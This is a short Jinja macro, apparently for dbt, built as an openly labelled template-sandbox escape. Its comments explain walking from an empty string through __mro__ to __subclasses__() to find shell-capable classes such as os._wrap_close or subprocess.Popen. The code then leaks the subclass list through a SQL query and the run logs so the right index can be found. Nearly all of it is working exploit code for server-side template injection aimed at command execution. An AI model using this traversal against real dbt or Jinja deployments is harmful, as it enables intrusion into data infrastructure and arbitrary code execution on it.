{% macro show_who_am_i() %}
  {# 
     Traversal Exploit: 
     1. Take an empty string ""
     2. Get its class (__class__)
     3. Go to the base object (__mro__[1])
     4. Find all subclasses (__subclasses__())
     5. Look for a class that can execute shell commands (like 'os._wrap_close' or 'subprocess.Popen')
  #}
  
  {% set out = "" %}
  
  {# This attempt tries to find a class with access to 'os' or 'sys' #}
  {% set leak = "".__class__.__mro__[1].__subclasses__() %}

  {% set sql %}
    {# 
       We try to find the index for a dangerous class. 
       Usually, index 130-150 is 'os._wrap_close' in Python 3.10.
    #}
    select '{{ leak | string | truncate(500) }}' as subclasses_sample
  {% endset %}

  {% set results = run_query(sql) %}

  {% if execute %}
    {% for row in results %}
      {{ log("BREADCRUMBS: " ~ row[0], info=True) }}
    {% endfor %}
  {% endif %}
{% endmacro %}
